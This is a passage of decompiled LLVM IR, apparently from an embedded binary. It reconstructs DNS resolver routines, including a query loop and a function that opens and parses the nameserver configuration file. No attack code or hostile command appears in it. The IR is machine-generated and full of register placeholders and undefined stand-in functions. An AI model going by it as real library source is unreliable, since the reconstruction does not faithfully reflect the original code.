  store i32 268589904, i32* @lr, align 4
  %v0_10025b4c = call i32 @memcpy()
  %v0_10025b50 = load i32, i32* @r31, align 4
  %v1_10025b50 = add i32 %v0_10025b50, 4
  %v2_10025b50 = inttoptr i32 %v1_10025b50 to i32*
  %v3_10025b50 = load i32, i32* %v2_10025b50, align 4
  %v3_10025b54 = icmp eq i32 %v3_10025b50, 24
  br i1 %v3_10025b54, label %dec_label_pc_10025b28.dec_label_pc_10025b78_crit_edge, label %dec_label_pc_10025b5c

dec_label_pc_10025b28.dec_label_pc_10025b78_crit_edge: ; preds = %dec_label_pc_10025b28
  %v1_10025b78.pre = load i32, i32* @r16, align 4
  br label %dec_label_pc_10025b78

dec_label_pc_10025b5c:                            ; preds = %dec_label_pc_10025b28
  %v1_10025b5c = add i32 %v0_10025b50, 28
  %v2_10025b5c = inttoptr i32 %v1_10025b5c to i32*
  %v3_10025b5c = load i32, i32* %v2_10025b5c, align 4
  store i32 %v3_10025b5c, i32* %r0.global-to-local, align 4
  %v3_10025b60 = icmp eq i32 %v3_10025b5c, 0
  br i1 %v3_10025b60, label %dec_label_pc_10025c28, label %dec_label_pc_10025b68

dec_label_pc_10025b68:                            ; preds = %dec_label_pc_10025b5c
  %v0_10025b68 = load i32, i32* @r16, align 4
  %v3_10025b68 = icmp eq i32 %v0_10025b68, 1
  br i1 %v3_10025b68, label %dec_label_pc_10025b78, label %dec_label_pc_10025b70

dec_label_pc_10025b70:                            ; preds = %dec_label_pc_10025b68
  %v3_10025b70 = icmp eq i32 %v0_10025b68, 28
  br i1 %v3_10025b70, label %dec_label_pc_10025b78, label %dec_label_pc_10025c28

dec_label_pc_10025b78:                            ; preds = %dec_label_pc_10025b28.dec_label_pc_10025b78_crit_edge, %dec_label_pc_10025b70, %dec_label_pc_10025b68
  %v1_10025b78 = phi i32 [ %v1_10025b78.pre, %dec_label_pc_10025b28.dec_label_pc_10025b78_crit_edge ], [ 28, %dec_label_pc_10025b70 ], [ 1, %dec_label_pc_10025b68 ]
  %v4_10025b78 = icmp eq i32 %v3_10025b50, %v1_10025b78
  br i1 %v4_10025b78, label %dec_label_pc_10025b8c, label %dec_label_pc_10025b80

dec_label_pc_10025b80:                            ; preds = %dec_label_pc_10025b78
  %v1_10025b80 = inttoptr i32 %v0_10025b50 to i32*
  %v2_10025b80 = load i32, i32* %v1_10025b80, align 4
  store i32 %v2_10025b80, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10025b88.1371 to i32), i32* @lr, align 4
  %v0_10025b84 = call i32 @free()
  br label %dec_label_pc_10025c0c

dec_label_pc_10025b8c:                            ; preds = %dec_label_pc_10025b78
  %v1_10025b90 = add i32 %v0_10025b50, 16
  %v2_10025b90 = inttoptr i32 %v1_10025b90 to i32*
  %v3_10025b90 = load i32, i32* %v2_10025b90, align 4
  store i32 %v3_10025b90, i32* %r11.global-to-local, align 4
  %v0_10025b94 = load i32, i32* @r24, align 4
  %v2_10025b94 = sub i32 %tmp35, %v0_10025b94
  %v1_10025b98 = add i32 %v0_10025b50, 32
  %v2_10025b98 = inttoptr i32 %v1_10025b98 to i32*
  %v3_10025b98 = load i32, i32* %v2_10025b98, align 4
  store i32 %v3_10025b98, i32* %r0.global-to-local, align 4
  %v1_10025b9c = add i32 %v2_10025b94, -1
  %v1_10025ba0 = add i32 %v3_10025b90, 4
  %v2_10025ba4 = mul i32 %v1_10025b9c, %v1_10025ba0
  store i32 %v2_10025ba4, i32* %r11.global-to-local, align 4
  %v2_10025ba8 = add i32 %v0_10025b50, 36
  %v3_10025ba8 = inttoptr i32 %v2_10025ba8 to i32*
  store i32 %v1_10025b9c, i32* %v3_10025ba8, align 4
  %v0_10025bac = load i32, i32* %r11.global-to-local, align 4
  %v1_10025bac = load i32, i32* %r0.global-to-local, align 4
  %v3_10025bac = icmp ugt i32 %v0_10025bac, %v1_10025bac
  br i1 %v3_10025bac, label %dec_label_pc_10025c28, label %dec_label_pc_10025bb4

dec_label_pc_10025bb4:                            ; preds = %dec_label_pc_10025b8c
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10025bbc = load i32, i32* @r31, align 4
  %v2_10025bbc = add i32 %v1_10025bbc, 36
  %v3_10025bbc = inttoptr i32 %v2_10025bbc to i32*
  store i32 0, i32* %v3_10025bbc, align 4
  br label %dec_label_pc_10025c0c

dec_label_pc_10025bc4:                            ; preds = %dec_label_pc_10025b1c
  %v3_10025bc4 = load i32, i32* %stack_var_-184, align 4
  store i32 %v3_10025bc4, i32* @r3, align 4
  store i32 268590028, i32* @lr, align 4
  %v0_10025bc8 = call i32 @free()
  store i32 %tmp29, i32* %r0.global-to-local, align 4
  %v1_10025bd0 = load i32, i32* @r16, align 4
  %v4_10025bd0 = icmp eq i32 %tmp29, %v1_10025bd0
  br i1 %v4_10025bd0, label %dec_label_pc_10025bd8, label %dec_label_pc_10025c0c

dec_label_pc_10025bd8:                            ; preds = %dec_label_pc_10025bc4
  %v0_10025bd8 = load i32, i32* @r31, align 4
  %v1_10025bd8 = add i32 %v0_10025bd8, 16
  %v2_10025bd8 = inttoptr i32 %v1_10025bd8 to i32*
  %v3_10025bd8 = load i32, i32* %v2_10025bd8, align 4
  store i32 %v3_10025bd8, i32* @r5, align 4
  store i32 %tmp28, i32* %r0.global-to-local, align 4
  %v4_10025be0 = icmp eq i32 %v3_10025bd8, %tmp28
  br i1 %v4_10025be0, label %dec_label_pc_10025be8, label %dec_label_pc_10025c6c

dec_label_pc_10025be8:                            ; preds = %dec_label_pc_10025bd8
  %v1_10025be8 = add i32 %v0_10025bd8, 36
  %v2_10025be8 = inttoptr i32 %v1_10025be8 to i32*
  %v3_10025be8 = load i32, i32* %v2_10025be8, align 4
  %v1_10025bec = add i32 %v0_10025bd8, 28
  %v2_10025bec = inttoptr i32 %v1_10025bec to i32*
  %v3_10025bec = load i32, i32* %v2_10025bec, align 4
  store i32 %v3_10025bec, i32* %r0.global-to-local, align 4
  %v2_10025bf0 = mul i32 %v3_10025be8, %tmp28
  %v2_10025bf8 = add i32 %v3_10025bec, %v2_10025bf0
  store i32 %v2_10025bf8, i32* @r3, align 4
  store i32 268590080, i32* @lr, align 4
  %v0_10025bfc = call i32 @memcpy()
  %v0_10025c00 = load i32, i32* @r31, align 4
  %v1_10025c00 = add i32 %v0_10025c00, 36
  %v2_10025c00 = inttoptr i32 %v1_10025c00 to i32*
  %v3_10025c00 = load i32, i32* %v2_10025c00, align 4
  %v1_10025c04 = add i32 %v3_10025c00, 1
  store i32 %v1_10025c04, i32* %v2_10025c00, align 4
  br label %dec_label_pc_10025c0c

dec_label_pc_10025c0c:                            ; preds = %dec_label_pc_10025bc4, %dec_label_pc_10025bb4, %dec_label_pc_10025b80, %dec_label_pc_10025be8
  %stack_var_-88.0 = phi i32 [ 0, %dec_label_pc_10025be8 ], [ 0, %dec_label_pc_10025bc4 ], [ 0, %dec_label_pc_10025bb4 ], [ %stack_var_-88.118, %dec_label_pc_10025b80 ]
  %v0_10025c0c = load i32, i32* @r28, align 4
  %v1_10025c0c = load i32, i32* %r15.global-to-local, align 4
  %v2_10025c0c = add i32 %v1_10025c0c, %v0_10025c0c
  store i32 %v2_10025c0c, i32* %r28.global-to-local, align 4
  %v0_10025c10 = load i32, i32* @r24, align 4
  %v1_10025c10 = add i32 %v0_10025c10, 1
  store i32 %v1_10025c10, i32* @r24, align 4
  store i32 %tmp35, i32* %r0.global-to-local, align 4
  %v2_10025c18 = icmp slt i32 %v1_10025c10, %tmp35
  br i1 %v2_10025c18, label %dec_label_pc_10025c20, label %dec_label_pc_10025c28

dec_label_pc_10025c20:                            ; preds = %dec_label_pc_10025ad4, %dec_label_pc_10025c0c
  %v0_10025aec = phi i32 [ %v2_10025c0c, %dec_label_pc_10025c0c ], [ %v2_10025ab8, %dec_label_pc_10025ad4 ]
  %stack_var_-88.118 = phi i32 [ %stack_var_-88.0, %dec_label_pc_10025c0c ], [ 1, %dec_label_pc_10025ad4 ]
  %v1_10025c20 = load i32, i32* @r27, align 4
  %v2_10025c20 = icmp slt i32 %v0_10025aec, %v1_10025c20
  br i1 %v2_10025c20, label %dec_label_pc_10025ae4, label %dec_label_pc_10025c28

dec_label_pc_10025c28:                            ; preds = %dec_label_pc_10025b0c, %dec_label_pc_10025ad4, %dec_label_pc_10025c20, %dec_label_pc_10025b5c, %dec_label_pc_10025b8c, %dec_label_pc_10025c0c, %dec_label_pc_10025b70
  %v0_10025c28 = load i32, i32* @r19, align 4
  store i32 268590128, i32* @lr, align 4
  %v1_10025c2c = call i32 @__libc_close(i32 %v0_10025c28)
  %v3_10025c34 = icmp eq i32 %arg5, 0
  %v0_10025c44 = load i32, i32* @r30, align 4
  br i1 %v3_10025c34, label %dec_label_pc_10025c44, label %dec_label_pc_10025c3c

dec_label_pc_10025c3c:                            ; preds = %dec_label_pc_10025c28
  %v2_10025c3c = inttoptr i32 %arg5 to i32*
  store i32 %v0_10025c44, i32* %v2_10025c3c, align 4
  br label %dec_label_pc_10025c4c

dec_label_pc_10025c44:                            ; preds = %dec_label_pc_10025c28
  store i32 %v0_10025c44, i32* @r3, align 4
  store i32 268590156, i32* @lr, align 4
  %v0_10025c48 = call i32 @free()
  br label %dec_label_pc_10025c4c

dec_label_pc_10025c4c:                            ; preds = %dec_label_pc_10025c3c, %dec_label_pc_10025c44
  %v0_10025c4c = load i32, i32* @r21, align 4
  store i32 %v0_10025c4c, i32* @r3, align 4
  store i32 268763136, i32* %r29.global-to-local, align 4
  store i32 268590168, i32* @lr, align 4
  %v0_10025c54 = call i32 @free()
  store i32 ptrtoint (i32* @global_var_1004db58.1359 to i32), i32* @r29, align 4
  br label %dec_label_pc_10025d50

dec_label_pc_10025c6c:                            ; preds = %dec_label_pc_10025bd8
  %v1_10025c6c = inttoptr i32 %v0_10025bd8 to i32*
  %v2_10025c6c = load i32, i32* %v1_10025c6c, align 4
  store i32 %v2_10025c6c, i32* @r3, align 4
  store i32 268590196, i32* @lr, align 4
  %v0_10025c70 = call i32 @free()
  br label %dec_label_pc_10025c74

dec_label_pc_10025c74:                            ; preds = %dec_label_pc_10025a84, %dec_label_pc_100259ec, %dec_label_pc_10025b0c, %dec_label_pc_10025b04, %dec_label_pc_10025a04, %dec_label_pc_100259cc, %dec_label_pc_10025c6c
  %v0_10025c74 = load i32, i32* @r17, align 4
  %v3_10025c74 = icmp eq i32 %v0_10025c74, 0
  br i1 %v3_10025c74, label %dec_label_pc_10025c7c, label %dec_label_pc_10025ccc

dec_label_pc_10025c7c:                            ; preds = %dec_label_pc_10025c74
  store i32 ptrtoint (i32* @global_var_10045088.1212 to i32), i32* %r29.global-to-local, align 4
  store i32 %v2_10025780, i32* @r28, align 4
  %v4_10025c98 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-228, i32 268527848, i32 ptrtoint (i32* @global_var_10045088.1212 to i32))
  store i32 268590244, i32* @lr, align 4
  %v1_10025ca0 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_10045088.1212 to i32))
  %v3_10025ca8 = load i32, i32* @global_var_10045290.1363, align 4
  store i32 %v2_10025780, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  %v1_10025cb4 = add i32 %v3_10025ca8, -1
  store i32 %v1_10025cb4, i32* @r29, align 4
  store i32 268590268, i32* @lr, align 4
  %v0_10025cb8 = call i32 @__pthread_cleanup_pop_restore()
  %v0_10025cbc = load i32, i32* @r22, align 4
  %v1_10025cbc = load i32, i32* @r29, align 4
  %v2_10025cbc = icmp slt i32 %v0_10025cbc, %v1_10025cbc
  br i1 %v2_10025cbc, label %dec_label_pc_10025cc4, label %dec_label_pc_10025ccc

dec_label_pc_10025cc4:                            ; preds = %dec_label_pc_10025c7c
  %v1_10025cc4 = add i32 %v0_10025cbc, 1
  store i32 %v1_10025cc4, i32* @r22, align 4
  br label %dec_label_pc_10025ce8thread-pre-split.backedge

dec_label_pc_10025ce8thread-pre-split.backedge:   ; preds = %dec_label_pc_10025cc4, %dec_label_pc_10025a6c, %dec_label_pc_10025ce4
  %v0_10025ce8.pr = load i32, i32* @r18, align 4
  %tmp65 = icmp ult i32 %v0_10025ce8.pr, 3
  br i1 %tmp65, label %dec_label_pc_100257dc.lr.ph, label %dec_label_pc_10025d00

dec_label_pc_10025ccc:                            ; preds = %dec_label_pc_1002597c, %dec_label_pc_10025c7c, %dec_label_pc_10025c74, %dec_label_pc_10025994
  %v0_10025ccc = load i32, i32* @r26, align 4
  %v1_10025ccc = add i32 %v0_10025ccc, 1
  store i32 %v1_10025ccc, i32* %r0.global-to-local, align 4
  %v1_10025cd0 = load i32, i32* @r23, align 4
  %v2_10025cd0 = srem i32 %v1_10025ccc, %v1_10025cd0
  store i32 %v2_10025cd0, i32* @r26, align 4
  %v5_10025cd8 = icmp eq i32 %v2_10025cd0, 0
  br i1 %v5_10025cd8, label %dec_label_pc_10025ce0, label %dec_label_pc_10025ce4

dec_label_pc_10025ce0:                            ; preds = %dec_label_pc_10025ccc
  %v0_10025ce0 = load i32, i32* @r18, align 4
  %v1_10025ce0 = add i32 %v0_10025ce0, 1
  store i32 %v1_10025ce0, i32* @r18, align 4
  br label %dec_label_pc_10025ce4

dec_label_pc_10025ce4:                            ; preds = %dec_label_pc_10025ccc, %dec_label_pc_10025ce0
  store i32 -1, i32* @r22, align 4
  br label %dec_label_pc_10025ce8thread-pre-split.backedge

dec_label_pc_100257dc.lr.ph:                      ; preds = %dec_label_pc_100257dc.lr.ph.lr.ph, %dec_label_pc_10025ce8thread-pre-split.backedge
  br label %dec_label_pc_100257dc

dec_label_pc_10025cf4:                            ; preds = %dec_label_pc_10025754, %dec_label_pc_1002574c, %dec_label_pc_10025744, %entry
  store i32 -1, i32* @r19, align 4
  store i32 -1, i32* @r26, align 4
  store i32 -1, i32* @r25, align 4
  br label %dec_label_pc_10025d00

dec_label_pc_10025d00:                            ; preds = %dec_label_pc_10025ce8thread-pre-split.backedge, %dec_label_pc_100257ec, %dec_label_pc_100258c8, %dec_label_pc_1002598c, %dec_label_pc_10025760, %dec_label_pc_10025cf4
  %v0_10025d00 = call i32 @__GI___h_errno_location()
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10025d08 = inttoptr i32 %v0_10025d00 to i32*
  store i32 -1, i32* %v2_10025d08, align 4
  %v0_10025d0c = load i32, i32* @r25, align 4
  store i32 %v0_10025d0c, i32* @r20, align 4
  br label %dec_label_pc_10025d10

dec_label_pc_10025d10:                            ; preds = %dec_label_pc_10025aac, %dec_label_pc_10025d00
  %v0_10025d10 = load i32, i32* @r19, align 4
  %v3_10025d10 = icmp eq i32 %v0_10025d10, -1
  br i1 %v3_10025d10, label %dec_label_pc_10025d20, label %dec_label_pc_10025d18

dec_label_pc_10025d18:                            ; preds = %dec_label_pc_10025d10
  store i32 268590368, i32* @lr, align 4
  %v1_10025d1c = call i32 @__libc_close(i32 %v0_10025d10)
  br label %dec_label_pc_10025d20

dec_label_pc_10025d20:                            ; preds = %dec_label_pc_10025d10, %dec_label_pc_10025d18
  %v0_10025d20 = load i32, i32* @r21, align 4
  store i32 %v0_10025d20, i32* @r3, align 4
  store i32 -1, i32* @r27, align 4
  store i32 268590380, i32* @lr, align 4
  %v0_10025d28 = call i32 @free()
  %v0_10025d2c = load i32, i32* @r30, align 4
  store i32 %v0_10025d2c, i32* @r3, align 4
  store i32 268590388, i32* @lr, align 4
  %v0_10025d30 = call i32 @free()
  %v0_10025d34 = load i32, i32* @r26, align 4
  %v3_10025d34 = icmp eq i32 %v0_10025d34, -1
  br i1 %v3_10025d34, label %dec_label_pc_10025d80, label %dec_label_pc_10025d3c

dec_label_pc_10025d3c:                            ; preds = %dec_label_pc_10025d20
  store i32 ptrtoint (i32* @global_var_1004db58.1359 to i32), i32* @r29, align 4
  %v2_10025d48 = ptrtoint i32* %stack_var_-228 to i32
  br label %dec_label_pc_10025d50

dec_label_pc_10025d50:                            ; preds = %dec_label_pc_10025c4c, %dec_label_pc_10025d3c
  %storemerge68 = phi i32 [ %v2_10025d48, %dec_label_pc_10025d3c ], [ %v2_10025780, %dec_label_pc_10025c4c ]
  %v1_10025d54.pre-phi = phi i32 [ %v2_10025d48, %dec_label_pc_10025d3c ], [ %v2_10025780, %dec_label_pc_10025c4c ]
  store i32 %storemerge68, i32* @r28, align 4
  %v4_10025d58 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-228, i32 ptrtoint (i32* @global_var_1004db58.1359 to i32), i32 ptrtoint (i32* @global_var_1004db58.1359 to i32))
  %v0_10025d5c = load i32, i32* @r29, align 4
  store i32 268590436, i32* @lr, align 4
  %v1_10025d60 = call i32 @pthread_mutex_lock(i32 %v0_10025d5c)
  %v0_10025d68 = load i32, i32* @r26, align 4
  store i32 %v0_10025d68, i32* @global_var_10045288.1360, align 4
  store i32 %v1_10025d54.pre-phi, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  %v0_10025d78 = load i32, i32* @r20, align 4
  %v1_10025d78 = trunc i32 %v0_10025d78 to i16
  store i16 %v1_10025d78, i16* @global_var_10045084.1361, align 2
  store i32 268590464, i32* @lr, align 4
  %v0_10025d7c = call i32 @__pthread_cleanup_pop_restore()
  br label %dec_label_pc_10025d80

dec_label_pc_10025d80:                            ; preds = %dec_label_pc_10025d20, %dec_label_pc_10025d50
  store i32 %v0_10025700, i32* %r0.global-to-local, align 4
  %v0_10025d84 = load i32, i32* @r27, align 4
  ret i32 %v0_10025d84

; uselistorder directives
  uselistorder i32 %v2_10025cd0, { 1, 0 }
  uselistorder i32 %v0_10025c44, { 1, 0 }
  uselistorder i32 %v1_10025c20, { 1, 0 }
  uselistorder i32 %stack_var_-88.118, { 1, 0, 2 }
  uselistorder i32 %v0_10025aec, { 1, 0 }
  uselistorder i32 %v1_10025c10, { 1, 0 }
  uselistorder i32 %v0_10025bd8, { 0, 2, 1, 3 }
  uselistorder i32 %v1_10025b9c, { 1, 0 }
  uselistorder i32 %v0_10025b28, { 2, 1, 0 }
  uselistorder i32 %v0_10025ac4, { 1, 0 }
  uselistorder i32 %v2_10025ab8, { 0, 2, 1, 3 }
  uselistorder i32 %v4_100259dc, { 1, 0 }
  uselistorder i32 %v1_100258dc, { 1, 0 }
  uselistorder i32 %v1_100258b0, { 1, 0 }
  uselistorder i32 %v1_1002587c, { 1, 0 }
  uselistorder i32 %v1_10025814, { 1, 0 }
  uselistorder i32 %v2_10025780, { 0, 1, 4, 5, 2, 3, 6, 7, 8 }
  uselistorder i32* %stack_var_-228, { 4, 5, 1, 2, 3, 0, 6 }
  uselistorder i32* %stack_var_-144, { 1, 0, 2, 3 }
  uselistorder i16* %stack_var_-212, { 0, 1, 4, 3, 2 }
  uselistorder i32* %stack_var_-184, { 1, 0, 2 }
  uselistorder i32 %tmp36, { 1, 0, 2 }
  uselistorder i32 %tmp35, { 6, 5, 0, 1, 2, 4, 3 }
  uselistorder i32 %tmp29, { 1, 0 }
  uselistorder i32 %tmp28, { 0, 2, 1 }
  uselistorder i32* %r29.global-to-local, { 1, 2, 3, 5, 4, 0, 6, 7, 8, 9, 10 }
  uselistorder i32* %r28.global-to-local, { 1, 3, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 5, 16, 6, 7, 8, 11, 9, 10, 12, 13, 14, 15, 2, 17, 0, 1, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_recv, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_poll, { 0, 3, 2, 1 }
  uselistorder i32 101, { 2, 1, 3, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 1, 0 }
  uselistorder i32 (i32)* @inet_addr, { 3, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 0, 12, 11, 10, 9, 8, 7, 6, 5, 4, 1, 2 }
  uselistorder i32 53, { 6, 0, 3, 1, 4, 2, 5 }
  uselistorder i16 10, { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32, i32)* @strncpy, { 2, 11, 10, 9, 8, 7, 6, 1, 0, 5, 4, 3 }
  uselistorder i16* @global_var_10045084.1361, { 1, 0 }
  uselistorder i32 268527848, { 2, 0, 3, 1, 5, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_1004db58.1359 to i32), { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 268763136, { 4, 5, 0, 6, 1, 2, 3 }
  uselistorder i32 1025, { 2, 3, 1, 6, 0, 4, 5 }
  uselistorder i32 512, { 4, 8, 3, 9, 10, 11, 12, 13, 0, 5, 1, 6, 2, 7 }
  uselistorder label %dec_label_pc_10025d80, { 1, 0 }
  uselistorder label %dec_label_pc_10025d50, { 1, 0 }
  uselistorder label %dec_label_pc_10025d20, { 1, 0 }
  uselistorder label %dec_label_pc_10025d10, { 1, 0 }
  uselistorder label %dec_label_pc_10025d00, { 5, 0, 3, 2, 1, 4 }
  uselistorder label %dec_label_pc_100257dc.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_10025ce4, { 1, 0 }
  uselistorder label %dec_label_pc_10025ccc, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_10025ce8thread-pre-split.backedge, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10025c74, { 6, 2, 3, 0, 4, 1, 5 }
  uselistorder label %dec_label_pc_10025c4c, { 1, 0 }
  uselistorder label %dec_label_pc_10025c28, { 2, 5, 4, 6, 3, 0, 1 }
  uselistorder label %dec_label_pc_10025c20, { 1, 0 }
  uselistorder label %dec_label_pc_10025c0c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10025b78, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10025ab4, { 1, 0 }
  uselistorder label %dec_label_pc_10025aac, { 1, 0 }
  uselistorder label %dec_label_pc_10025950, { 1, 0 }
  uselistorder label %dec_label_pc_100258c8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100257ec, { 1, 0 }
}

define i32 @__open_nameservers() local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-164 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_10045088.1212 to i32), i32* @r29, align 4
  %v2_10025db8 = ptrtoint i32* %stack_var_-200 to i32
  store i32 %v2_10025db8, i32* %r3.global-to-local, align 4
  %v4_10025dc0 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-200, i32 add (i32 ptrtoint (i32* @global_var_10010000.20 to i32), i32 26856), i32 ptrtoint (i32* @global_var_10045088.1212 to i32))
  %v0_10025dc4 = load i32, i32* @r29, align 4
  store i32 %v0_10025dc4, i32* %r3.global-to-local, align 4
  store i32 268590540, i32* @lr, align 4
  %v1_10025dc8 = call i32 @pthread_mutex_lock(i32 %v0_10025dc4)
  store i32 %v1_10025dc8, i32* %r3.global-to-local, align 4
  %v3_10025dd0 = load i32, i32* @global_var_1004528c.1213, align 4
  %v2_10025dd4 = icmp sgt i32 %v3_10025dd0, 0
  br i1 %v2_10025dd4, label %dec_label_pc_1002604c, label %dec_label_pc_10025ddc

dec_label_pc_10025ddc:                            ; preds = %entry
  store i32 ptrtoint ([17 x i8]* @global_var_1002fb40.1373 to i32), i32* %r3.global-to-local, align 4
  store i32 268590580, i32* @lr, align 4
  %v3_10025df0 = call i32 @__GI_fopen(i32 ptrtoint ([17 x i8]* @global_var_1002fb40.1373 to i32), i32 ptrtoint (i32* @global_var_1002fb28.1345 to i32))
  store i32 %v3_10025df0, i32* %r3.global-to-local, align 4
  store i32 %v3_10025df0, i32* @r26, align 4
  %v3_10025df4 = icmp eq i32 %v3_10025df0, 0
  br i1 %v3_10025df4, label %dec_label_pc_10025dfc, label %dec_label_pc_10026010.preheader

dec_label_pc_10025dfc:                            ; preds = %dec_label_pc_10025ddc
  %v0_10025e00 = load i32, i32* @r31, align 4
  store i32 ptrtoint ([24 x i8]* @global_var_1002fb54.1374 to i32), i32* %r3.global-to-local, align 4
  store i32 268590604, i32* @lr, align 4
  %v3_10025e08 = call i32 @__GI_fopen(i32 ptrtoint ([24 x i8]* @global_var_1002fb54.1374 to i32), i32 %v0_10025e00)
  store i32 %v3_10025e08, i32* %r3.global-to-local, align 4
  store i32 %v3_10025e08, i32* @r26, align 4
  %v3_10025e0c = icmp eq i32 %v3_10025e08, 0
  br i1 %v3_10025e0c, label %dec_label_pc_10026040, label %dec_label_pc_10026010.preheader

dec_label_pc_10026010.preheader:                  ; preds = %dec_label_pc_10025ddc, %dec_label_pc_10025dfc
  %v0_1002601c16 = phi i32 [ %v3_10025df0, %dec_label_pc_10025ddc ], [ %v3_10025e08, %dec_label_pc_10025dfc ]
  %v2_10026010 = ptrtoint i32* %stack_var_-164 to i32
  %v1_10025e1c2 = bitcast i32* %stack_var_-164 to i8*
  %v3_10025f00 = inttoptr i32 %tmp to i8*
  br label %dec_label_pc_10026010

dec_label_pc_10025e18:                            ; preds = %dec_label_pc_10025e30
  %v1_10025e18 = add i32 %v0_10025ed89, 1
  store i32 %v1_10025e18, i32* %r3.global-to-local, align 4
  %v1_10025e1c = inttoptr i32 %v1_10025e18 to i8*
  %v2_10025e1c = load i8, i8* %v1_10025e1c, align 1
  %v3_10025e1c = zext i8 %v2_10025e1c to i32
  store i32 %v3_10025e1c, i32* %r11.global-to-local, align 4
  store i32 268697600, i32* @r8, align 4
  %v3_10025e24 = icmp eq i8 %v2_10025e1c, 0
  %v1_10025e28 = mul nuw nsw i32 %v3_10025e1c, 2
  store i32 %v1_10025e28, i32* @r10, align 4
  br i1 %v3_10025e24, label %dec_label_pc_10026010.backedge, label %dec_label_pc_10025e30

dec_label_pc_10025e30:                            ; preds = %dec_label_pc_10025e30.lr.ph, %dec_label_pc_10025e18
  %v0_10025e48 = phi i32 [ %v3_10025e1c4, %dec_label_pc_10025e30.lr.ph ], [ %v3_10025e1c, %dec_label_pc_10025e18 ]
  %v0_10025ed89 = phi i32 [ %v2_10026010, %dec_label_pc_10025e30.lr.ph ], [ %v1_10025e18, %dec_label_pc_10025e18 ]
  %v0_10025e34 = phi i32 [ %v1_10025e288, %dec_label_pc_10025e30.lr.ph ], [ %v1_10025e28, %dec_label_pc_10025e18 ]
  %v2_10025e34 = add i32 %v0_10025e34, %v3_10025e30.pre
  %v3_10025e34 = inttoptr i32 %v2_10025e34 to i16*
  %v4_10025e34 = load i16, i16* %v3_10025e34, align 2
  %v1_10025e38 = and i16 %v4_10025e34, 32
  %v3_10025e38 = icmp eq i16 %v1_10025e38, 0
  br i1 %v3_10025e38, label %dec_label_pc_10025e40, label %dec_label_pc_10025e18

dec_label_pc_10025e40:                            ; preds = %dec_label_pc_10025e30
  %v3_10025e40 = icmp eq i32 %v0_10025e48, 10
  br i1 %v3_10025e40, label %dec_label_pc_10026010.backedge, label %dec_label_pc_10025e48

dec_label_pc_10026010.backedge:                   ; preds = %dec_label_pc_10025e18, %dec_label_pc_10025fc4, %dec_label_pc_10025fcc, %dec_label_pc_10026004, %dec_label_pc_10025e1c.preheader, %dec_label_pc_10025e40, %dec_label_pc_10025e48, %dec_label_pc_10025f6c
  %v0_1002601c.pre = load i32, i32* @r26, align 4
  br label %dec_label_pc_10026010

dec_label_pc_10025e48:                            ; preds = %dec_label_pc_10025e40
  %v3_10025e48 = icmp eq i32 %v0_10025e48, 35
  br i1 %v3_10025e48, label %dec_label_pc_10026010.backedge, label %dec_label_pc_10025e50

dec_label_pc_10025e50:                            ; preds = %dec_label_pc_10025e48
  store i32 268697600, i32* @r10, align 4
  store i32 0, i32* @r27, align 4
  store i32 %v2_10025db8, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v1_10025ed810 = inttoptr i32 %v0_10025ed89 to i8*
  %v2_10025ed811 = load i8, i8* %v1_10025ed810, align 1
  %v3_10025edc14 = icmp eq i8 %v2_10025ed811, 0
  br i1 %v3_10025edc14, label %dec_label_pc_10025eec, label %dec_label_pc_10025ee4

dec_label_pc_10025e64:                            ; preds = %dec_label_pc_10025ee4
  %v1_10025e64 = mul i32 %v0_10025e64, 4
  %v3_10025e68 = load i32, i32* @global_var_1004515c, align 4
  store i32 %v3_10025e68, i32* %r11.global-to-local, align 4
  %v1_10025e6c = load i32, i32* %r6.global-to-local, align 4
  %v2_10025e6c = add i32 %v1_10025e6c, %v1_10025e64
  %v2_10025e70 = add i32 %v2_10025e6c, 16
  %v3_10025e70 = inttoptr i32 %v2_10025e70 to i32*
  store i32 %v0_10025e70, i32* %v3_10025e70, align 4
  %v0_10025e7c.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10025e7c

dec_label_pc_10025e78:                            ; preds = %dec_label_pc_10025e90
  %v1_10025e78 = add i32 %v0_10025e78, 1
  store i32 %v1_10025e78, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10025e7c

dec_label_pc_10025e7c:                            ; preds = %dec_label_pc_10025e64, %dec_label_pc_10025e78
  %v0_10025e78 = phi i32 [ %v0_10025e7c.pre, %dec_label_pc_10025e64 ], [ %v1_10025e78, %dec_label_pc_10025e78 ]
  %v1_10025e7c = inttoptr i32 %v0_10025e78 to i8*
  %v2_10025e7c = load i8, i8* %v1_10025e7c, align 1
  %v3_10025e80 = icmp eq i8 %v2_10025e7c, 0
  br i1 %v3_10025e80, label %dec_label_pc_10025eac, label %dec_label_pc_10025e90

